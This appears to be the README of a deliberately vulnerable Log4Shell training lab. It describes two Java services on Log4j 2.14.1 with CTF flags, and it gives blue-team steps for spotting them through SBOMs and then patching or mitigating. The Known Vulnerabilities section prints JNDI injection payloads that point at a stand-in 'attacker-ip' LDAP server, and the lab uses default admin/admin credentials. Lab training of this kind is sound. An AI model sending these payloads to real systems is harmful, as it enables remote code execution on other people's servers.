# 🎯 VULN-Log4Shell (Target Asset)

## 📖 Overview

**Service Type:** Multi-service enterprise environment (Auth, Inventory, Status)
**Language:** Java 11 / Spring Boot · Python 3.9 / Flask
**Status:** ⚠️ INTENTIONALLY VULNERABLE

This repository simulates a realistic enterprise environment where **two of three services use a vulnerable version of Log4j (2.14.1)**, exposing them to CVE-2021-44228 (Log4Shell). The third service runs Python and is not affected.

This scenario teaches:
- **Red Team:** How to detect and exploit Log4Shell via JNDI injection
- **Blue Team:** How SBOMs enable rapid identification of vulnerable dependencies

> ⚠️ **Training use only.** Run exclusively inside isolated lab environments.

---

## 🏗️ Architecture

| Service | Host port (DEMO-FULL) | Container port | Language | Log4j | Vulnerable |
|---------|------------------------|----------------|----------|-------|------------|
| Auth Service | 8101 | 8001 | Java / Spring Boot | 2.14.1 | ✅ YES |
| Inventory Service | 8102 | 8002 | Java / Spring Boot | 2.14.1 | ✅ YES |
| Status Service | 8103 | 8003 | Python / Flask | None | ❌ NO |

### Why three services?
The scenario mirrors real-world environments where not every service shares the same dependencies. The Status Service (Python) is intentionally safe — demonstrating that **you cannot assume all services are vulnerable**. SBOMs are needed to determine exactly which services use Log4j.

---

## 🚀 Administrator Controls (monorepo)

Run from the **repository root** (`DEMO-FULL/`):

| Command | Description |
|---------|-------------|
| `make up` | Start full stack (includes these three services) |
| `make down` | Stop entire stack |
| `make reset-log4j` | Recreate **only** the Log4j lab containers |
| `make logs` | All container logs |
| `make test-log4j` | Health checks against host ports 8101–8103 |

---

## 🚩 Flag Locations

| Flag | Location | How to Reach |
|------|----------|-------------|
| **Auth Flag** | `/flags/auth_flag.txt` in auth container | RCE via Log4Shell on `POST /login` (host **8101**) |
| **Inventory Flag** | `/flags/inventory_flag.txt` in inventory container | RCE via Log4Shell on `GET /search?q=` (host **8102**) |

---

## 🛠️ Service Configuration

| Setting | Value (DEMO-FULL host ports) |
|---------|-------------------------------|
| Auth Service | `http://localhost:8101` |
| Inventory Service | `http://localhost:8102` |
| Status Service | `http://localhost:8103` |

**Default Credentials (Auth Service):**
- Admin: `admin` / `admin`

---

## ⚠️ Known Vulnerabilities

### 1. Log4Shell — CVE-2021-44228 (Auth Service — host port 8101)
**Where:** `POST /login` — `username` field is logged directly by Log4j without sanitization.

**Payload:**
```
{"username": "${jndi:ldap://attacker-ip:1389/exploit}", "password": "test"}
```

**How it works:**
1. Attacker sends JNDI lookup string as the username
2. Log4j processes the string and makes an outbound LDAP request to attacker's server
3. Attacker's LDAP server returns a malicious Java class
4. Java class executes arbitrary code on the target

---

### 2. Log4Shell — CVE-2021-44228 (Inventory Service — host port 8102)
**Where:** `GET /search?q=` — search query is logged directly by Log4j.

**Payload:**
```
GET /search?q=${jndi:ldap://attacker-ip:1389/exploit}
```

---

### 3. Status Service — NOT Vulnerable
`GET /search?q=` on host port 8103 accepts the same input but uses Python's standard logging library — no JNDI processing occurs.

---

## 🏹 Attacker approach

Use your own JNDI/LDAP tooling (for example [JNDI-Exploit-Kit](https://github.com/welk1n/JNDI-Injection-Exploit) or class‑teaching listeners) against the endpoints above. Point payloads at `localhost:8101` (auth `/login` body) and `localhost:8102` (`/search?q=`).

---

## 🛡️ Blue Team — SBOM Defense

The Blue Team goal is to identify vulnerable services **before** the Red Team exploits them using Software Bill of Materials (SBOM).

### Generate SBOMs

```bash
# Install CycloneDX Maven plugin and generate SBOM for each Java service
cd services/auth-service
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom

cd services/inventory-service
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom
```

### Search SBOMs for Log4j

```bash
# Search generated SBOM for Log4j
grep -r "log4j" services/*/target/bom.xml

# Look for vulnerable versions (< 2.17.1)
grep -A2 "log4j-core" services/*/target/bom.xml
```

### Patch

Update `pom.xml` in each vulnerable service — change Log4j version from `2.14.1` to `2.17.1`:

```xml
<!-- Before (VULNERABLE) -->
<version>2.14.1</version>

<!-- After (PATCHED) -->
<version>2.17.1</version>
```

Then rebuild the lab containers:
```bash
# from repo root
make reset-log4j
```

### Mitigation without patching (Log4j 2.10+)

Set the JVM flag at startup to disable JNDI lookups:
```
-Dlog4j2.formatMsgNoLookups=true
```

Add to `Dockerfile` ENTRYPOINT:
```dockerfile
ENTRYPOINT ["java", "-Dlog4j2.formatMsgNoLookups=true", "-jar", "app.jar"]
```

---

## 📂 Repository Structure

| File / Directory | Purpose |
|-----------------|---------|
| `services/auth-service/` | Java Spring Boot auth app — Log4j 2.14.1 (vulnerable) |
| `services/inventory-service/` | Java Spring Boot inventory app — Log4j 2.14.1 (vulnerable) |
| `services/status-service/` | Python Flask status app — no Log4j (safe) |
| Root `docker-compose.yaml` | Defines all services for the monorepo |
| `flags/` | CTF flag files mounted into containers |
| `tools/test/test_services.sh` | Health check script (`make test-log4j`) |
| `restore.sh` | Recreate only Log4j services via root compose |

---

## 🔗 References

- [CVE-2021-44228 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Advisory](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Log4Shell Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)
- [NTIA SBOM Resources](https://www.ntia.gov/sbom)

---

*For training only. Run in isolated lab environments only.*
